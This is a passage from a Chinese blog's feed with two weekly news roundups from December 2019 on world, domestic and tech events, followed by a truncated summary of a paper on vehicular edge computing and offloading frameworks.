href="https://gizmodo.com/apple-and-nvidia-are-over-1840015246" target="_blank" rel="noopener">source</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://imgs.codewoody.com/uploads/big/77513bce2484c6ab38127447a5093c02.jpg&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Weekly" scheme="http://www.codewoody.com/categories/Weekly/"/>
    
    
      <category term="杂谈" scheme="http://www.codewoody.com/tags/%E6%9D%82%E8%B0%88/"/>
    
      <category term="科技新闻" scheme="http://www.codewoody.com/tags/%E7%A7%91%E6%8A%80%E6%96%B0%E9%97%BB/"/>
    
      <category term="转载" scheme="http://www.codewoody.com/tags/%E8%BD%AC%E8%BD%BD/"/>
    
      <category term="Weekly" scheme="http://www.codewoody.com/tags/Weekly/"/>
    
  </entry>
  
  <entry>
    <title>Weekly-27</title>
    <link href="http://www.codewoody.com/posts/4972/"/>
    <id>http://www.codewoody.com/posts/4972/</id>
    <published>2019-12-24T03:09:42.000Z</published>
    <updated>2020-01-15T08:07:20.709Z</updated>
    
    <content type="html"><![CDATA[<h2 id="新闻">新闻</h2><h3 id="长征五号发射成功"><a href="http://www.xinhuanet.com/2019-12/27/c_1125397145.htm" target="_blank" rel="noopener">长征五号发射成功</a></h3><p>12月27日20时45分，长征五号遥三运载火箭在中国文昌航天发射场点火升空，2000多秒后，与实践二十号卫星成功分离，将卫星送入预定轨道，任务取得圆满成功，这是长征系列运载火箭第323次发射。</p><p><img src="https://imgs.codewoody.com/uploads/big/cf4c99ff2d5e5a8d7c77bf088dab3b01.jpg"></p><h3 id="印巴在克什米尔交火"><a href="https://world.huanqiu.com/article/9CaKrnKmebY" target="_blank" rel="noopener">印巴在克什米尔交火</a></h3><p>12月26日，巴基斯坦三军公共关系局称，印度军队过去36小时内在克什米尔控制线沿线多次违反停火协议。作为回应，巴军在哈吉皮尔山口摧毁一处印军哨所并击毙5名印士兵，3名巴士兵阵亡。印军方称，巴军违反停火协议，在巴拉穆拉地区向印方开火，造成印1名士兵和1名平民丧生。</p><h3 id="波音ceo被解雇"><a href="https://www.nytimes.com/2019/12/23/business/Boeing-ceo-muilenburg.html" target="_blank" rel="noopener">波音CEO被解雇</a></h3><p><img src="https://imgs.codewoody.com/uploads/big/2aab3470d4911ab3b818429f4032f264.jpg"></p><p>波音解雇了 CEO Dennis Muilenburg，资深董事 David Calhoun 将从 1 月 13 日起接替 CEO 一职。工程师出身的 Muilenburg 在波音公司度过他的整个职业生涯，但受到广泛批评，被指对造成 346 人死亡的两起波音 737 Max 坠机事件做出犹豫不决和被动的反应。董事会表示，它意识到有必要改善沟通，尤其是与该公司的国内监管机构联邦航空管理局(FAA)的沟通。在辞职前，Muilenburg 一直坚称 737 Max 将在年底前复飞，但这一时间表被认为是不切实际的，遭到了 FAA 的公开批评。 737 Max 最早可能会在明年初复飞。</p><h3 id="沙特卡舒吉案五名沙特人被判死刑"><a href="https://www.dw.com/zh/卡舒吉之死：5名沙特人判死刑/a-51781538?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">沙特卡舒吉案五名沙特人被判死刑</a></h3><p>异见记者卡舒吉2018年在沙特驻伊斯坦布尔领馆内遇害。沙特检方判处5人死刑、3人监禁，均可提出上诉。联合国特别报告员批评幕后真凶逍遥法外。</p><p>2018年10月11日，土耳其警方通报美国方面称已掌握足够的证据证明贾迈勒·卡舒吉在10月2日进入沙特驻伊斯坦布尔领事馆时被沙特的特工所杀并分尸，之后尸体组织被转移。沙特政府曾一度否认此事，并称贾迈勒·卡舒吉当天就走出了领事馆，同月20日，沙特检察机关承认其已在馆内身亡，死亡的原因是与使馆人员发生争执而导致的肢体冲突。2019年6月19日，联合国特别报告员（United Nations special rapporteur）卡拉马德（Agnes Callamard）公布卡舒吉遇害案的调查报告。报告认为沙特王储穆罕默德·本·萨勒曼·本·阿卜杜勒-阿齐兹·阿勒沙特与此案有关联，应受到调查和制裁。<a href="https://zh.wikipedia.org/wiki/%E8%B3%88%E9%82%81%E5%8B%92%C2%B7%E5%8D%A1%E8%88%92%E5%90%89" target="_blank" rel="noopener">source</a></p><blockquote><p>现在全世界都知道卡舒吉案的幕后黑手是谁，但是谁也奈何不了这位沙特王储。</p></blockquote><h3 id="首例未婚冻卵引发的一般人格纠纷案开庭"><a href="https://www.zhihu.com/question/362537424" target="_blank" rel="noopener">首例未婚冻卵引发的一般人格纠纷案开庭</a></h3><p>今日（12月23日）上午，朝阳法院对外通报，全国首例因“冷冻卵子”而引发的一般人格权纠纷在北京市朝阳区人民法院公开开庭审理。</p><p>根据通报，31岁的原告徐女士，曾于2018年12月10日，向北京某医院提出冻卵需求。北京某医院依据《人类辅助生殖技术规范》相关规定，认为徐女士的情况不符合我国现行相关规范要求，拒绝了徐女士的请求。徐女士遂以受到歧视，侵害人格权为由诉至法院，要求医院提供冻卵服务，并承担诉讼费用。</p><p>当天上午，原告徐女士本人及其代理律师，被告北京某医院委托代理人到庭。部分新闻媒体记者旁听了案件审理。庭审过程中，双方各自陈述了诉辩意见，法庭主持双方进行了举证质证。庭审持续了约1小时，法庭宣布休庭。</p><h3 id="其他">其他</h3><h4 id="国内">国内</h4><ul><li>12 月 26 日公布的《最高人民法院关于修改<关于民事诉讼证据的若干规定>的决定》，今后微信微博聊天记录可以作为打官司的证据。<a href="https://www.williamlong.info/archives/5931.html" target="_blank" rel="noopener">source</a></关于民事诉讼证据的若干规定></li><li>因不满汇丰银行「按照国际监管标准」关闭所谓支援暴徒组织的 7000 万港币账户，一群黑衣人于旺角汇丰银行外聚集，破坏银行设施并试图纵火。<a href="https://t.me/KatyushaUnion/797" target="_blank" rel="noopener">source</a></li><li>《基本医疗卫生与健康促进法》28 日经过全国人大常委会表决通过，将于 2020 年 6 月 1 日开始实施。该法案是我国卫生健康领域内的第一部基础性、综合性的法律。其中明确规定：禁止任何组织和个人威胁、危害医疗卫生人员人身安全，侵犯医疗卫生人员人格尊严。<a href="http://www.npc.gov.cn/npc/c33559/201912/167b72ed38a54b1c988650b98deb34cb.shtml" target="_blank" rel="noopener">source</a></li><li>恒丰银行前董事长姜喜运被判处死缓。<a href="http://www.ftchinese.com/story/001085701" target="_blank" rel="noopener">source</a></li><li>2019年12月28日，十三届全国人大常委会第十五次会议通过了《全国人民代表大会常务委员会关于废止有关收容教育法律规定和制度的决定》，自2019年12月29日起施行。该决定废止了《全国人民代表大会常务委员会关于严禁卖淫嫖娼的决定》第四条第二款、第四款，以及据此实行的收容教育制度。同时决定还明确规定，在收容教育制度废止前，依法作出的收容教育决定有效；收容教育制度废止后，对正在被依法执行收容教育的人员，解除收容教育，剩余期限不再执行。</li><li>《中华人民共和国证券法》已由中华人民共和国第十三届全国人民代表大会常务委员会第十五次会议于2019年12月28日修订通过，自2020年3月1日起施行。据中国证监会法律部主任程合红，在国务院证券监督管理机构依照法定条件负责证券发行申请注册的基础上，<strong>取消发行审核委员会制度</strong>。</li></ul><h4 id="国际">国际</h4><ul><li>俄罗斯一架苏-57战机试飞时在远东坠毁。<a href="https://cn.reuters.com/article/russia-uac-su57-crash-1225-idCNKBS1YT02C?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></li><li>哈萨克斯坦一架载有 100 人的客机坠毁，已有 12 人死亡。<a href="https://cn.reuters.com/article/kazakhstanplan-crash-1227-idCNKBS1YV0A6?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></li><li>土耳其称受到利比亚民族团结政府邀请，将派遣军队进入利比亚干涉利比亚内战。派遣军队的议案将会在1月8日的土耳其议会中提交。获得国际社会认可的利比亚民族团结政府，陷入了与叛军指挥官哈利法•哈夫塔尔(Khalifa Haftar)领导的“国民军”(Libyan National Army)的权力斗争，后者占领了该国石油资源丰富的东部。<a href="http://www.ftchinese.com/story/001085698?full=y" target="_blank" rel="noopener">source</a></li><li>IS 宣布对布基纳法索军事基地袭击事件负责。24日，一名该组织的成员驾驶车辆冲入布基纳法索北部苏姆省一处军事基地，引爆了车上的炸弹，造成7名士兵身亡，多人受伤。</li><li>越南 2019 年 GDP 增长 7.02%。</li></ul><h4 id="科技">科技</h4><ul><li>百度发布 2019 年搜索排行榜。<a href="https://www.williamlong.info/archives/5924.html" target="_blank" rel="noopener">source</a></li><li>《柳叶刀》首发中文论文：谭文斐《给父亲的一封信》。<a href="https://www.cnbeta.com/articles/tech/926209.htm" target="_blank" rel="noopener">source</a></li><li>特斯拉已从一家由政府支持的中国银行组成的财团获得了112.5亿元人民币（合16亿美元）的廉价新融资。目前，特斯拉的上海超级工厂正加紧生产其面向大众市场的Model 3轿车。<a href="http://www.ftchinese.com/story/001085703" target="_blank" rel="noopener">source</a></li><li>12 月 20 日波音公司 Starliner 飞船发射成功，但是无法对接国际空间站。<a href="https://www.zhihu.com/question/362067335/answer/944951502" target="_blank" rel="noopener">source</a></li></ul><h2 id="资源与文章">资源与文章</h2><h3 id="王孟源-2019年的回顾与前瞻">王孟源: 2019年的回顾与前瞻</h3><iframe width="560" height="315" src="https://www.youtube.com/embed/tpLZZ3KI1qk" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://imgs.codewoody.com/uploads/big/cf4c99ff2d5e5a8d7c77bf088dab3b01.jpg&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Weekly" scheme="http://www.codewoody.com/categories/Weekly/"/>
    
    
      <category term="杂谈" scheme="http://www.codewoody.com/tags/%E6%9D%82%E8%B0%88/"/>
    
      <category term="科技新闻" scheme="http://www.codewoody.com/tags/%E7%A7%91%E6%8A%80%E6%96%B0%E9%97%BB/"/>
    
      <category term="转载" scheme="http://www.codewoody.com/tags/%E8%BD%AC%E8%BD%BD/"/>
    
      <category term="Weekly" scheme="http://www.codewoody.com/tags/Weekly/"/>
    
  </entry>
  
  <entry>
    <title>Weekly-26</title>
    <link href="http://www.codewoody.com/posts/54189/"/>
    <id>http://www.codewoody.com/posts/54189/</id>
    <published>2019-12-15T17:24:21.000Z</published>
    <updated>2020-01-15T08:07:20.709Z</updated>
    
    <content type="html"><![CDATA[<h2 id="新闻">新闻</h2><h3 id="第一艘国产航母山东号交付"><a href="http://www.xinhuanet.com/politics/2019-12/17/c_1125357773.htm" target="_blank" rel="noopener">第一艘国产航母山东号交付</a></h3><p>12 月 17 日，中国第一艘 002 型国产航空母舰17日下午在海南三亚某军港交付海军。中共中央总书记、国家主席、中央军委主席习近平出席交接入列仪式。经中央军委批准，我国第一艘国产航母命名为“中国人民解放军海军山东舰”，舷号为“17”。中央和国家机关有关部门、军委机关有关部门、南部战区、海军、海南省以及航母建设单位的负责同志参加仪式。</p><p>山东号于 2017 年 4 月 26 日下水，2018 年 5 月 13 日海试，2019 年 12 月 17 日正式入列。有意思的是，1888年 12 月 17 日，清光绪十四年冬月十五，北洋水师于山东威海卫刘公岛正式成立。</p><p><img src="https://imgs.codewoody.com/uploads/big/e9118c69c55d30fb0abeb50ca721b2f9.jpg"></p><p><img src="https://imgs.codewoody.com/uploads/big/c5c45498fac9590c6272fe3139667d6a.jpg"></p><h3 id="美国众议院通过特朗普弹劾案">美国众议院通过特朗普弹劾案</h3><p><img src="https://imgs.codewoody.com/uploads/big/90648a772417de40383649940910754c.jpg"></p><p>特朗普成为美国历史上第三位被众议院弹劾并通过的总统，随后弹劾案将移交参议院审核，以决定他是否能继续担任总统。当天众议院投票表决的两项弹劾指控是：滥用权力与妨碍国会调查。投票结果沿袭了众议院里的政党路线，几乎所有民主党人都支持两项指控，而所有共和党人投票反对。</p><p>当地时间晚上8：30，众议院开始依次对两项指控进行投票。第一项指控“滥用权力”获得通过，就意味着特朗普正式遭到众议院弹劾。最后的投票结果是，第一项指控“滥用权力”以230票支持197票反对获得通过，第二项指控“妨碍国会调查”以229票支持198票反对获得通过。</p><p>特朗普弹劾案源于他与乌克兰总统的一通电话。特朗普被指涉嫌与乌克兰政府达成利益交换，以拖延军事援助来要挟乌国调查其在2020年大选中的主要对手拜登（Joe Biden）。</p><h3 id="波音宣布暂时停产-737-max"><a href="https://www.zhihu.com/question/361273239" target="_blank" rel="noopener">波音宣布暂时停产 737 Max</a></h3><p>美国当地时间周一股市交易结束之后，波音发布消息称，从明年1月起暂时停产737Max机型。此举可能会对美国整体经济产生巨大影响。为数众多的供应商、航空公司和其他企业都可能因此而受到损失。</p><p>一年前波音的世界还岁月静好：尽管印度尼西亚已经发生了第一起737Max机型坠机事故，不过当时似乎波音公司完全没有受到任何负面影响。公司总裁米伦伯格（Dennis Muilenburg）还在庆祝巨大成功：波音在2018财政年度销售额突破1000亿美元大关，创下了这家百年老店一项历史记录。</p><p>不过，米伦贝格被当成英雄接受欢呼的时间很快宣告终止：2019年3月，一架几乎全新的737Max在埃塞俄比亚坠落。此后，波音的这款主力机型几乎遭到全球禁飞。</p><blockquote><p>在王孟源之前的一篇文章中提到，波音公司的堕落正式美国金融精英和资本力量的短视对于重视安全的工程师文化的「战胜」的表现。今天的波音在获取利润的能力是大大进步了，但是在推动航空技术的创新和确保飞行安全性上的重视上却退步了。所以出现 737 Max 这种事件是迟早的。事实上，波音公司既不是美国资本力量玩垮的第一家企业，也不会是最后一家。现在的问题是，波音留下的市场空白，会被谁占尽。</p></blockquote><h3 id="中国国际论文引用率提升"><a href="http://news.sciencenet.cn/htmlnews/2019/12/433991.shtm" target="_blank" rel="noopener">中国国际论文引用率提升</a></h3><p>根据2019中国科技论文统计结果，2009年至2019年（截至2019年10月）我国科技人员共发表国际论文260.64万篇，比2018年统计时增加了14.7%；论文共被引用2845.23万次，与上一个统计年度相比，增加了25.2%，连续三年排在世界第二位。虽然中国论文被引用次数增长的速度显著快于大多数国家，但与排在第一位的美国的7468.9万次相比，还有很大差距。</p><p>从篇均被引用率来看，我国平均每篇论文被引用10.92次，比上一年度统计时提高了9.2%。这意味着，从纵向比较，2009年至2019年10月间，我国国际科技论文的质量有了显著提升。但是，从横向比较的角度来看，本统计年度世界国际科技论文被引用次数的平均值达到每篇12.68次，比上一年度统计时的12.61次有所提高。这说明我国科技论文的质量虽然提升速度快，但与同期的世界平均值相比，还有不小的差距，需要进一步加快追赶步伐。</p><h3 id="印度今年宣布关闭互联网次数达-93-次"><a href="https://www.guancha.cn/internation/2019_12_19_528859.shtml" target="_blank" rel="noopener">印度今年宣布关闭互联网次数达 93 次</a></h3><p>印度在2014年经历了六次互联网关闭，到2015年上升到14次。在2016年，增加了一倍多，达到31次，在2017年达到79次。这一数字在2018年达到峰值，达到134次，到2019年12月15日，达到93次。数据显示，2018年世界上有67%的互联网中断在印度。2019年，印度宣布关闭互联网的次数为93次，总共影响了167个地区。</p><p>India Today数据情报部门(DIU)分析了该国的互联网关闭情况，发现恐怖活动和社区紧张局势是造成服务中断的最大原因。slfc.in和internetshutdowns.com编制的数据显示，自2014年以来，印度关闭互联网服务多达357次。</p><h3 id="美国成立太空军"><a href="https://www.bbc.com/zhongwen/simp/world-50878499" target="_blank" rel="noopener">美国成立太空军</a></h3><p>美国总统特朗普宣布正式成立太空军（the US Space Force）。美国这一新的军种，隶属美国空军，也是美军自70多年来第一次设立新军种。特朗普在华盛顿附近的军事基地宣布了这一重大消息。他说：“太空是世界上最新的战斗领域”。</p><p>“在国家安全处于重大威胁当中时，美国在太空领域的绝对优势是完全必要的。我们虽然处于领先，但领先程度还不够，不过我们很快就将大大地领先。”</p><p>“太空军将帮助我们阻吓进犯而且掌控绝对制高点。”</p><p>特朗普周五（20日）签署了7380亿美元的美军年度预算，而成立太空军获得的第一年拨款为4000万美元。</p><h3 id="其他">其他</h3><h4 id="国内">国内</h4><ul><li>湖南操场埋尸案主犯杜少平被判处死刑。<a href="https://www.zhihu.com/question/361624094" target="_blank" rel="noopener">source</a></li><li>2020 年考研人数突破 300 万，达到了 341 万人，比上一年的 290 万增长 17.59 %。</li><li>20 日是澳门回归 20 周年。澳门特别行政区政府于 20 日晨隆重矩形升旗仪式，庆祝澳门回归中国20周年。<a href="http://sputniknews.cn/video/201912211030291399/" target="_blank" rel="noopener">source</a></li><li>长安福特 AE 工程师邓乐家，吉大毕业，入职 8 年，长期高强度工作、加班，年仅30岁抑郁跳楼身亡。<a href="https://www.zhihu.com/question/362081267" target="_blank" rel="noopener">source</a></li></ul><h4 id="国际">国际</h4><ul><li>纽约时报引述匿名消息人士报导称，美国政府今年早些时候秘密驱逐了中国大使馆两名官员，此前这两位官员驾车闯入了一个军事基地。<a href="https://cn.reuters.com/article/nyt-usaexpelled-chinese-officials-1215-s-idCNKBS1YK0C6?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></li><li>密苏里州堪萨斯成为美国第一个提供免费公交的大城市。目前世界上绝大多数免费公交系统位于欧洲。</li><li>彭博社报道的假新闻导致法国最大的建筑承包商——万喜集团股票暴跌18.28%，法国有关当局16日对彭博开罚500万欧元。彭博社已宣布决定上诉。<a href="http://sputniknews.cn/society/201912171030255509/" target="_blank" rel="noopener">source</a></li><li>美国昆尼皮亚克大学（Quinnipiac University）进行的一项民调显示，美国总统特朗普的支持率达到最高点。<a href="http://sputniknews.cn/politics/201912171030254180/" target="_blank" rel="noopener">source</a></li><li>巴基斯坦前总统佩尔韦兹·穆沙拉夫被巴基斯坦特别法庭判处死刑。<a href="http://sputniknews.cn/politics/201912171030253960/" target="_blank" rel="noopener">source</a></li><li>南非总统拉马福萨 12 月 16 日发布特赦令，为庆祝种族和解日对 1.46 万名囚犯予以特赦。<a href="http://sputniknews.cn/society/201912171030251716/" target="_blank" rel="noopener">source</a></li><li>印度 Duke 号邮轮 12 月 15 日在尼日利亚海岸遭到海盗袭击，至少有 20 名印度船员被绑架。<a href="http://sputniknews.cn/society/201912171030251578/" target="_blank" rel="noopener">source</a></li><li>美国法官裁决美国政府有权扣押 Snowden 的图书销售收入。</li><li>印尼爆发非洲猪瘟。<a href="http://www.bbc.com/zhongwen/simp/world-50854389" target="_blank" rel="noopener">source</a></li><li>北溪二号天然气管道铺设公司因美国制裁威胁暂停工作。<a href="http://sputniknews.cn/politics/201912211030290318/" target="_blank" rel="noopener">source</a></li><li>习近平特朗普通电话。特朗普在推特表示，通话以经贸议题为重点，正式签署贸易协议已经在安排中。中国官媒新华社称，习近平在通话中“对近一段时间来美方在涉台、涉港、涉疆、涉藏等问题上的消极言行表示严重关切”。。<a href="http://www.bbc.com/zhongwen/simp/world-50876671" target="_blank" rel="noopener">source</a></li><li>本周五晚，特朗普签署 2020 年度国防授权法案。该文件牵涉 7380 亿美元的财政支出。<a href="https://www.dw.com/zh/特朗普签署国防授权法案-处处影射中国/a-51762998?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li><li>中国和俄罗斯否决了一项联合国援助叙利亚的决议。<a href="https://www.dw.com/zh/俄中否决联合国援助叙利亚决议/a-51764565?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li><li>特朗普批准制裁北溪 2 号。默克尔政府谴责了这项制裁令，普京则称要采取“对等”措施。<a href="https://www.dw.com/zh/特朗普批准制裁北溪2号项目-德国政府抗议/a-51763601?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li><li>俄罗斯“成功测试”了与世界不联通的全俄互联网。</li><li>周四，日本法务省对2003年在福冈市杀害一家四口的中国籍死刑犯执行了死刑。参与作案的另外两名中国人逃回中国后，一人2005年被判无期徒刑，另一人同年被执行死刑。<a href="https://www.dw.com/zh/福冈灭门案中国死刑犯在日被绞刑处决/a-51798650?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li></ul><h4 id="科技">科技</h4><ul><li>12 月 18 日柳传志宣布卸任联想控股董事长。<a href="https://www.zhihu.com/question/361689334" target="_blank" rel="noopener">source</a></li><li>魔兽争霸 3 重置版推迟到明年 1 月份发布。</li><li>海盗湾正在尝试高质量的视频流播放。<a href="https://torrentfreak.com/the-pirate-bay-is-trialing-high-quality-video-streaming-links-191209/" target="_blank" rel="noopener">source</a></li><li>12 月 19 日 PayPal 公司宣布，在 9 月 30 日中国人民银行批准后，PayPal 已完成对国付宝信息科技有限公司 (Gopay) 70% 股权的收购，交易完成以后，PayPal 成为第一家获准在中国市场提供在线支付服务的外资支付平台。</li><li>FDA 批准世界上第一种埃博拉疫苗。</li><li>日本半导体巨头尔必达原社长坂本幸雄加入紫光集团。<a href="https://www.zhihu.com/question/362703941/answer/948679892" target="_blank" rel="noopener">source</a></li><li>中东流行的消息应用 ToTok 被下架，理由是阿联酋政府尝试利用这一应用监视用户。<a href="https://t.me/solidot/9874" target="_blank" rel="noopener">source</a></li><li>12 月 26 日 「金环日食」上演。<a href="https://www.zhihu.com/question/362905897" target="_blank" rel="noopener">source</a></li><li>12 月 24 日举办了 2019 龙芯产品发布会。<a href="https://www.zhihu.com/question/362663819" target="_blank" rel="noopener">source</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://imgs.codewoody.com/uploads/big/e9118c69c55d30fb0abeb50ca721b2f9.jpg&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Weekly" scheme="http://www.codewoody.com/categories/Weekly/"/>
    
    
      <category term="杂谈" scheme="http://www.codewoody.com/tags/%E6%9D%82%E8%B0%88/"/>
    
      <category term="科技新闻" scheme="http://www.codewoody.com/tags/%E7%A7%91%E6%8A%80%E6%96%B0%E9%97%BB/"/>
    
      <category term="转载" scheme="http://www.codewoody.com/tags/%E8%BD%AC%E8%BD%BD/"/>
    
      <category term="Weekly" scheme="http://www.codewoody.com/tags/Weekly/"/>
    
  </entry>
  
  <entry>
    <title>[读论文]车联网与边缘计算 2019</title>
    <link href="http://www.codewoody.com/posts/17042/"/>
    <id>http://www.codewoody.com/posts/17042/</id>
    <published>2019-12-12T03:05:32.000Z</published>
    <updated>2020-01-15T08:07:20.709Z</updated>
    
    <content type="html"><![CDATA[<p>还是 VTM 的文章。这次是 2019 年最新一年的文章：<a href="https://ieeexplore.ieee.org/document/8581401" target="_blank" rel="noopener">Mobile Edge Computing For the Internet of Vechicles: Offloading framework and job scheduling</a>。文章主要关注了车联网场景下的边缘计算问题。这也是时下研究的一个热点方向。</p><blockquote><p>看完了文章可以来写评论了。这篇文章写的就非常简略了，基本上有营养的就只是提到了边缘计算的 <i>System Model</i>。对于具体的机制过程缺少详细的介绍。这也是 Magazine 文章的风格吧。要了解车联网边缘面临的重要问题还是得去看 Transaction 的文章吧。</p></blockquote><a id="more"></a><hr><h2 id="研究背景">研究背景</h2><p>移动边缘计算 (Mobile Edge Computing) 可以使得车辆之间能够共享计算资源。在这篇文章里面，我们提出了一种分布式的车辆边缘计算解决方案: <i>autonomous vehicular edge</i> (AVE)，可以让相邻车辆之间通过 V2V 通信共享计算资源。我们进一步扩展这一想法，提出了 <i>hybrid vehicular edge cloud</i> (HVC) 的概念。在 HVC 中车辆可以访问周围各种不同的计算纪元，包括路边单元 (Roadside Unit, RSU) 以及云上的计算资源。最后我们验证了这里提出了两种去中心化方案的性能，并讨论了一些 Open Problems。</p><p>现代车辆，尤其是自动驾驶车辆内部对于计算性能的要求越来越高。除了驾驶系统本身的需求，乘客的娱乐需求也需要消耗一部分的计算资源。直接升级硬件是最简单的，不过会显著推高成本。此时让车辆能够使用外部的计算资源能够作为一个可行的替代选项。不过利用外部计算资源面临着通信的延时和可靠性困难。</p><p>MEC 技术也被称为雾计算 (fog computting)。MEC 在边缘网络提供了云计算的能力。在车联网场景中，邻接汽车和 RSU 可以作为合适的外部计算资源的来源。现有的边缘计算方案一般收到两个方面的制约：要么只适用于静止的场景；要么是中心化架构，缺少分布式的实现。如何在高动态的车联网场景中提供通用的、高效的边缘计算解决方案目前还是悬而未决的问题。其中的关键问题是如何发现可用的计算以及如何调度计算卸载，并优化性能目标。</p><p>这篇文章针对郊区车联网和城市车联网两种场景分别设计了车联网 MEC 机制。分别是分布式实现版本 AVE 和 Online 实现版本 HVC。</p><p>在 AVE 中我们通过 DSRC 通信协议在车辆之间以去中心化的方式共享计算资源。AVE 机制不涉及基础设施。AVE 的工作流包括计算任务缓存，邻居节点发现，计算任务调度，数据传输，任务执行以及计算结果传输。邻居节点的数据，包括 GPS 数据，会用于邻接节点发现和计算任务调度。</p><p>在 HVC 中，我们扩展了 AVE 机制以支持路边单元和云上服务器（通过蜂窝网络）。这些基础设施相比邻居车辆拥有更强大的计算资源。多址接入技术，如 LTE 以及 毫米波通信，也被引入到 V2X 通信中。我们研究了如何高效的利用这些通信手段，并设计了在线计算卸载调度算法。仿真验证了通信性能对于混合车辆边缘计算框架性能的影响。</p><h2 id="车联网边缘计算框架">车联网边缘计算框架</h2><h3 id="系统模型">系统模型</h3><p>这里我们用如下的一些通用的指标来度量计算任务：</p><ol type="1"><li>Utility 效用: 按成这项计算任务能够带来的用户体验提升；</li><li>Host specified: 提供计算的 processor 必须要满足一定的要求才能处理计算任务；</li><li>Context-free 上下文无关: 一个计算任务包含了完成计算的所有数据，可以在任何节点上完成预算；</li><li>Brief: 为描述计算任务的信息；</li></ol><p>我们这里将客户端程序号成为 application modules，将服务端程序称为 back-end modules，如下图所示。</p><p><img src="https://imgs.codewoody.com/uploads/big/0a9e0ebd00eb049b2fb5af26bb266781.png"></p><p>应用 (Application) 运行于原生操作系统之上，由操作系统管理优先级和资源。后端 (back end) 运行在虚拟机上，虚拟机则由我们的框架管理。框架中的管理模块实现为中间层软件<span class="foot-note-span">【这里的<strong>中间</strong>指介于应用和后端之间】</span>，用来收集计算任务和计算结果的信息，并负责判断和执行计算卸载。</p><p>还有一些定义需要引入。我们称产生计算任务请求的节点为 requester，接受任务请求处理计算的是 processor。计算卸载的两个核心任务是：requester 如何发现附近的可用 processor，以及 requester 按照何种规则将计算任务发送给哪个 processor。</p><h3 id="ave-框架">AVE 框架</h3><h4 id="workflow">Workflow</h4><p>AVE 是为分布式场景提出。在 AVE 中不涉及基础设施，计算卸载发生在相邻的车辆之间。车间数据交换通过基于 IEEE 802.11p 的 V2V 通信进行。AVE 的工作流如下图所示。</p><figure><img src="https://imgs.codewoody.com/uploads/big/162bb60ac832cc5b2c5789683c7ef66f.png" alt><figcaption>Workflow of AVE</figcaption></figure><p>上图中的关键步骤如下：</p><ol type="1"><li><strong>通过 Beacon 广播发现邻接网络的计算资源</strong>: Beacon 消息比较简单，包含了描述节点的基础信息。对于 requester 来说，周围发送 Beacon 的相对速度比较小的车辆可以成为潜在的 processor。</li><li><strong>计算任务缓冲</strong>: 当计算任务产生时，不会立即调度出去。节点一般会缓冲这个计算任务，以寻找更加合适的任务分配方案，并避免并发的卸载调度请求。</li><li><strong>Processor 发现</strong>：在 Beacon 阶段发现了潜在的 processors，那么 requester 会进入 processor-discovery 阶段。此时 requester 会广播一个消息为缓存中的计算任务寻找可用的 processor。这个广播消息里面会包含计算任务的需求，requester的速度等信息。可用的 processor 会在受到此广播消息后反馈完成该计算任务需要的时间的估计值。</li><li><strong>计算任务调度</strong>：同时有多个就计算任务需要调度到多个车辆上。考虑 DSRC 有限的信道容量。传输时间也是在计算卸载调度中需要考虑的重要因素。</li><li><strong>计算卸载</strong>：从 processor-discovery 到开始卸载中的传输的间隔通常非常短。我们认为这段时间内网络结构没有发生变化，那么计算卸载中的数据传输路径可以采用和发现阶段同样的传输路径。而为了将计算结果返回到 requester，我们采用了一个比较传统的路由协议：<i>ad hoc on-demand distance vector routing</i>。</li></ol><h4 id="基于-aco-的调度算法">基于 ACO 的调度算法</h4><p>在计算任务调度过程中，调度需要给出计算任务传输的顺序（这里我们不考虑任务的并行传输）以及每个计算任务分配的 processor，以使得目标函数值最大化。从数学上来看，这个问题是 <i>two-stage hybrid flow-step problem</i>，这类问题是 <a href="https://en.wikipedia.org/wiki/NP-hardness" target="_blank" rel="noopener">NP 难</a>的。而在 AVE 框架中，调度需要在车上进行，计算资源相对受限，因此我们需要一个高线的算法来求解这样的问题。</p><p>我们提出的解决方案采用了基于 ACO 的算法<span class="foot-note-span">【ACO 为蚁群算法，是一种启发式算法】</span>。该算法可以以非常小的计算成本得到次优解。类似于 <i>particle swarm optimization</i> 和 <i>stochastic diffusion search</i>，ACO 算法也是用了群体智能(<i>swarm intelligence</i>)。</p><blockquote><p>具体的 ACO 算法建模方法在文章里面没有说，作者给了一个参考文献，指向文章：<i>AVE: Autonomous vehicular edge computing framework with ACO-based scheduling</i>。这篇文章也是本篇 Magazine 的作者写的。</p></blockquote><h3 id="hvc-框架">HVC 框架</h3><p>HVC 的主要改进是引入了基础设施角色，其中 RSU 还有云端服务器都可以作为计算资源的来源。我们假设 V2X 通信使用的是 IEEE 802.11p 或者是毫米波通信。</p><p>requester 和 processor 之间可以通过毫米波设备进行直接通信，或者可以通过毫米波中继（在我们的 HVC 场景中毫米波通信最多两跳）。毫米波信道建模时引入了一个失败概率，用来模拟毫米波的指向性和易被遮挡的特点。如果计算任务被调度到远端云上处理，这是计算任务的上传通过蜂窝网络进行。如何组织这些计算和通信资源是一个挑战。</p><h4 id="workflow-1">Workflow</h4><figure><img src="https://imgs.codewoody.com/uploads/big/fc6aa048f0fd666f2bdb7a0703afb8ae.png" alt><figcaption>Workflow of HVC</figcaption></figure><p>上图展示了 HVC 框架的工作流，我们这里关注一下和 AVE 的不同部分。</p><ol type="1"><li>Beacon 和 processor 发现：为了减少计算任务的等待时间，这里的 Beacon 消息包含了更多的信息，故后面再做调度时不需要重复再做一遍 processor 发现。当一个车辆收到来自 RSU 或者邻居车辆的 Beacon 